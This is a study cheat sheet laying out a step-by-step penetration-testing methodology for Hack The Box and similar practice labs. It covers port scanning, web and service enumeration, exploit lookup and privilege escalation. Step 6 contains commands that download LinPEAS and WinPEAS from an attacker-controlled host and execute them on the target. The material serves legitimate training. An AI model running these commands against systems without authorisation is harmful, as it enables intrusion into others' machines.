# HTB Machine Methodology

A repeatable systematic approach to HTB and PG machines. Methodology prevents tunnel vision — the most common reason people get stuck.

## Step 1: Initial Enumeration (15 min)

```bash
# Fast scan first — get open ports quickly
nmap -p- --min-rate 5000 -oN nmap-allports.txt $TARGET

# Service/version scan on discovered ports
nmap -p 22,80,443,445 -sC -sV -oN nmap-services.txt $TARGET

# UDP scan (background — slow)
sudo nmap -sU --top-ports 100 -oN nmap-udp.txt $TARGET &
```

Document every open port, service, version number.

## Step 2: Web Enumeration (if HTTP/HTTPS present, 20 min)

```bash
# Directory bruteforce
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -o gobuster-80.txt

# Quick vuln scan
nikto -h http://$TARGET -o nikto.txt

# Manual: view page source, check /robots.txt, /sitemap.xml, error messages
```

Note: CMS version, login forms, upload functionality, API endpoints.

## Step 3: Service-Specific Enumeration (20 min)

```bash
# SMB (port 445)
smbclient -L //$TARGET -N
enum4linux-ng $TARGET -A

# FTP (port 21)
ftp $TARGET   # try anonymous login

# SNMP (UDP 161)
snmpwalk -v1 -c public $TARGET

# NFS (port 2049)
showmount -e $TARGET
```

## Step 4: Research and Exploit Identification (15 min)

```bash
# Search for known exploits
searchsploit [service] [version]
searchsploit apache 2.4.49

# Cross-reference
# NVD: nvd.nist.gov
# ExploitDB: exploit-db.com
# GitHub: search "[service] [version] exploit"
```

## Step 5: Initial Access

Attempt identified exploits. Try manual before Metasploit — exam has Metasploit restrictions.
If web: try SQLi, file upload, LFI/RFI, command injection before checking exploits.

## Step 6: Local Enumeration for PrivEsc (20 min)

```bash
# Linux
wget http://KALI/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out

# Windows
certutil -urlcache -f http://KALI/winpeas.exe C:\Windows\Temp\winpeas.exe
C:\Windows\Temp\winpeas.exe > C:\Windows\Temp\winpeas.out
```

## Step 7: PrivEsc → Root/SYSTEM

Act on LinPEAS/WinPEAS output. Prioritize: SUID binaries, sudo rules, writable crons, service misconfigs, credentials in files.

## Time-Boxing Rules

- 30 min on any single approach without progress → pivot to different angle
- 2 hours total without initial access → check forum hints, not full writeup
- 4 hours total → read writeup, understand why your approach failed, redo from scratch

## Post-Machine Documentation

After solving: write up steps, screenshot proof, note what you missed and why. This is how you improve.
